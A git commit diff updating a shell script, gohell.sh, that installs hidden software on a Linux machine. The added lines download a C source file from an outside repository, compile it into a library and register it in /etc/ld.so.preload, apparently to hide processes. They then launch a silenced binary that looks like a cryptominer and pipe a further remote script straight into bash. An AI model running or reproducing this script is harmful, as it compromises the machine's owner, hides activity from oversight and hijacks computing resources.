ab611d19caad554eda3e548ee5d93062c1651160
sitina21 <150987536+sitina21@users.noreply.github.com>
2023-11-20 09:54:57 +0700

    Update gohell.sh

--- gohell.sh
+++ gohell.sh
@@ -1,6 +1,14 @@
+#!/bin/bash
+apt-get update ; apt-get install sudo -y
+curl https://github.com/adawisaud/adawisaud/raw/main/nyumput.c -o nyumput.c
+apt-get install build-essential -y
+gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
+mv libnyumput.so /usr/local/lib/
+echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
+rm nyumput.c
+mkdir .kap && cd .kap
 git clone https://github.com/sitina21/epep.git
 cd epep
-chmod +x config.json
-chmod +x zepo
-./zepo -c "config.json" >/dev/null 2>&1
-while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
+chmod +x config.json && chmod +x xmolx
+./xmolx -c "config.json" >/dev/null 2>&1
+curl -sL https://github.com/sitina21/zuph/raw/main/gobel.sh | bash
